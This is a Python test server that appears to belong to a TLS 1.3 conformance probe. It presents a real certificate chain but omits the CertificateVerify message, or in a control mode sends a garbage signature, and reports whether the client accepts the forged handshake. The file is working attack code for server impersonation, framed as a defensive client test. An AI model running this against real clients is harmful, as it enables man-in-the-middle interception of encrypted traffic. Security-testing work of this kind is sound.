#!/usr/bin/env python3
"""An adversarial TLS 1.3 server for probe-tls13-certverify-bypass.

Presents a GENUINE, chain-verifiable certificate (leaf + CA, both minted by
the driving shell script) but does NOT hold the leaf's private key -- exactly
the position of an on-path attacker who has captured the target's public
certificate (anyone can: it is sent in the clear on every real connection)
but not its key. RFC 8446 4.4.3 makes the server's CertificateVerify signature
the ONE thing in the flight that only the key-holder can produce; everything
else (the certificate bytes, the Finished MAC) an attacker can compute for
itself once it controls its own end of the ECDHE.

Two modes:

  omit-cv   Send EncryptedExtensions, Certificate, Finished -- and NO
            CertificateVerify message at all. This is the attack. If the
            client accepts it, whatever the client sends next is on keys the
            server (attacker) fully controls.

  honest    The same flight, but WITH a CertificateVerify -- containing 69
            bytes of garbage instead of a real signature. This is the
            control: it must be rejected AT THE SIGNATURE, which is what
            proves the flight is otherwise well-formed (right certificate,
            right Finished, right transcript) and that it is specifically
            the OMISSION in the other mode -- nothing else -- opening the
            door.

Verdict, printed as the last line of stdout and nothing else: this file has
no opinion about whether ACCEPTED is good or bad (a fixed client and probe
run this script exactly the same either way), so that judgement -- and the
one that matters -- lives entirely in run-tls13-certverify-bypass-probe.sh.

  ACCEPTED   the client sent an encrypted record (content type 0x17) after
             our flight. In TLS 1.3 that can only be its own Finished or
             later application data, both of which require the client to
             have derived handshake traffic keys from a schedule it believes
             completed -- i.e. it treated our flight as authentic.
  REJECTED   the client closed the connection (or the read timed out) without
             ever sending an encrypted record: it noticed something was
             wrong and aborted before deriving anything from our flight.

Everything below is the minimum TLS 1.3 server-side key schedule needed to
answer a real ClientHello and produce a flight that decrypts and MACs
correctly under the real spec -- x25519 ECDHE, HKDF-Extract/Expand-Label
(RFC 8446 7.1), AES-128-GCM record protection. It is deliberately NOT a
general server: no HelloRetryRequest, no groups but x25519, no resumption.
Those would make it a second TLS implementation to keep correct; this one
only has to be correct enough to be indistinguishable, up to the message this
probe is about, from the real thing.

Usage: tls13_certverify_omit_server.py <listen-port> <chain.pem> <omit-cv|honest>
"""
import base64
import hashlib
import hmac
import re
import socket
import struct
import sys

from cryptography.hazmat.primitives.asymmetric.x25519 import (
    X25519PrivateKey, X25519PublicKey)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PORT = int(sys.argv[1])
CHAIN_PATH = sys.argv[2]
MODE = sys.argv[3]
assert MODE in ("omit-cv", "honest"), "usage: ... <listen-port> <chain.pem> <omit-cv|honest>"


def hkdf_extract(salt, ikm):
    return hmac.new(salt, ikm, hashlib.sha256).digest()


def hkdf_expand(prk, info, length):
    out, t, i = b"", b"", 1
    while len(out) < length:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        out += t
        i += 1
    return out[:length]


def expand_label(secret, label, ctx, length):
    full = b"tls13 " + label
    info = struct.pack(">H", length) + bytes([len(full)]) + full + bytes([len(ctx)]) + ctx
    return hkdf_expand(secret, info, length)


def derive_secret(secret, label, transcript_msgs):
    return expand_label(secret, label, hashlib.sha256(transcript_msgs).digest(), 32)


def read_pem_chain(path):
    ders = []
    for m in re.findall(r"-----BEGIN CERTIFICATE-----(.+?)-----END CERTIFICATE-----",
                         open(path).read(), re.S):
        ders.append(base64.b64decode(m.replace("\n", "")))
    return ders


def recv_record(sock, buf):
    """Read one whole TLS record (5-byte header + body) off sock, buffering
    leftover bytes in `buf`. Returns (record_bytes_or_None, new_buf)."""
    while len(buf) < 5 or len(buf) < 5 + struct.unpack(">H", buf[3:5])[0]:
        d = sock.recv(4096)
        if not d:
            return None, buf
        buf += d
    n = struct.unpack(">H", buf[3:5])[0]
    return buf[:5 + n], buf[5 + n:]


def parse_client_hello_x25519_share(ch_msg):
    """ch_msg is the handshake message body (type+len+ClientHello). Returns
    the client's x25519 key_share public value, or None."""
    p = 4 + 2 + 32                          # msg type/len, legacy_version, random
    sidlen = ch_msg[p]
    p += 1 + sidlen                         # session_id
    cslen = struct.unpack(">H", ch_msg[p:p + 2])[0]
    p += 2 + cslen                          # cipher_suites
    complen = ch_msg[p]
    p += 1 + complen                        # compression_methods
    extlen = struct.unpack(">H", ch_msg[p:p + 2])[0]
    p += 2
    eend = p + extlen
    while p + 4 <= eend:
        et, el = struct.unpack(">HH", ch_msg[p:p + 4])
        p += 4
        if et == 51:                        # key_share
            q = p + 2
            while q + 4 <= p + el:
                g, kl = struct.unpack(">HH", ch_msg[q:q + 4])
                q += 4
                if g == 0x001d:              # x25519
                    return ch_msg[q:q + kl]
                q += kl
        p += el
    return None


def main():
    chain_ders = read_pem_chain(CHAIN_PATH)

    ls = socket.socket()
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("127.0.0.1", PORT))
    ls.listen(1)
    sys.stderr.write("tls13_certverify_omit_server: mode=%s port=%d\n" % (MODE, PORT))
    sys.stderr.flush()

    conn, _ = ls.accept()
    buf = b""
    rec, buf = recv_record(conn, buf)
    if rec is None:
        print("REJECTED")           # no ClientHello at all -- nothing to report as accepted
        return
    ch = rec[5:]                    # the ClientHello handshake message
    cpub = parse_client_hello_x25519_share(ch)
    if cpub is None:
        sys.stderr.write("tls13_certverify_omit_server: client offered no x25519 share\n")
        print("REJECTED")
        return

    # -- ServerHello: echo the session id, pick x25519 + TLS_AES_128_GCM_SHA256 --
    p = 4 + 2 + 32
    sidlen = ch[p]
    sid = ch[p + 1:p + 1 + sidlen]
    priv = X25519PrivateKey.generate()
    spub = priv.public_key().public_bytes_raw()

    def ext(t, body):
        return struct.pack(">H", t) + struct.pack(">H", len(body)) + body

    sh_body = b"\x03\x03" + bytes(32) + bytes([len(sid)]) + sid + b"\x13\x01" + b"\x00"
    exts = ext(43, b"\x03\x04") + ext(51, struct.pack(">HH", 0x001d, len(spub)) + spub)
    sh_body += struct.pack(">H", len(exts)) + exts
    sh = b"\x02" + struct.pack(">I", len(sh_body))[1:] + sh_body
    conn.sendall(b"\x16\x03\x03" + struct.pack(">H", len(sh)) + sh)
    conn.sendall(b"\x14\x03\x03\x00\x01\x01")       # CCS, middlebox-compat only

    # -- key schedule up through the handshake secret (RFC 8446 7.1) --
    shared = priv.exchange(X25519PublicKey.from_public_bytes(cpub))
    early = hkdf_extract(bytes(32), bytes(32))
    derived = derive_secret(early, b"derived", b"")
    hs = hkdf_extract(derived, shared)
    transcript = ch + sh
    s_hs = derive_secret(hs, b"s hs traffic", transcript)
    skey = expand_label(s_hs, b"key", b"", 16)
    siv = expand_label(s_hs, b"iv", b"", 12)
    saead = AESGCM(skey)

    seq = 0

    def seal(inner_content_type, plaintext):
        pt = plaintext + bytes([inner_content_type])
        aad = bytes([23, 3, 3]) + struct.pack(">H", len(pt) + 16)
        nonce = bytes(a ^ b for a, b in zip(siv, bytes(4) + struct.pack(">Q", seq)))
        ct = saead.encrypt(nonce, pt, aad)
        return b"\x17\x03\x03" + struct.pack(">H", len(ct)) + ct

    # -- the flight under test: EncryptedExtensions, Certificate, [CertificateVerify], Finished --
    ee = b"\x08\x00\x00\x02\x00\x00"
    cert_list = b""
    for der in chain_ders:
        cert_list += struct.pack(">I", len(der))[1:] + der + b"\x00\x00"   # no extensions per cert
    cert_body = b"\x00" + struct.pack(">I", len(cert_list))[1:] + cert_list
    cert = b"\x0b" + struct.pack(">I", len(cert_body))[1:] + cert_body
    transcript += ee + cert
    flight = ee + cert

    if MODE == "honest":
        # ecdsa_secp256r1_sha256 (0x0403), 69 bytes of garbage in place of a
        # real signature. Deliberately the same length class as a real P-256
        # ECDSA DER signature so a length-based sniff test could not tell the
        # two apart -- only actually verifying it can.
        sig = b"\x30" + bytes(69)
        cv_body = struct.pack(">H", 0x0403) + struct.pack(">H", len(sig)) + sig
        cv = b"\x0f" + struct.pack(">I", len(cv_body))[1:] + cv_body
        transcript += cv
        flight += cv
    # omit-cv: nothing added here. That is the whole attack.

    fin_key = expand_label(s_hs, b"finished", b"", 32)
    fin_val = hmac.new(fin_key, hashlib.sha256(transcript).digest(), hashlib.sha256).digest()
    fin = b"\x14\x00\x00\x20" + fin_val
    transcript += fin
    flight += fin

    conn.sendall(seal(22, flight))          # whole flight as one handshake-typed appdata record
    sys.stderr.write("tls13_certverify_omit_server: sent EE+%dcert%s+Fin (CertificateVerify=%s)\n" %
                      (len(chain_ders), "s" if len(chain_ders) != 1 else "",
                       "bogus" if MODE == "honest" else "OMITTED"))
    sys.stderr.flush()

    accepted = False
    conn.settimeout(6.0)
    try:
        while True:
            rec, buf = recv_record(conn, buf)
            if rec is None:
                break
            if rec[0] == 0x17:              # any encrypted record: Finished or app data
                accepted = True
                sys.stderr.write(
                    "tls13_certverify_omit_server: client sent an ENCRYPTED record after "
                    "our flight -- it derived handshake traffic keys from a schedule it "
                    "believes completed\n")
                break
    except socket.timeout:
        pass
    conn.close()
    print("ACCEPTED" if accepted else "REJECTED")


if __name__ == "__main__":
    main()
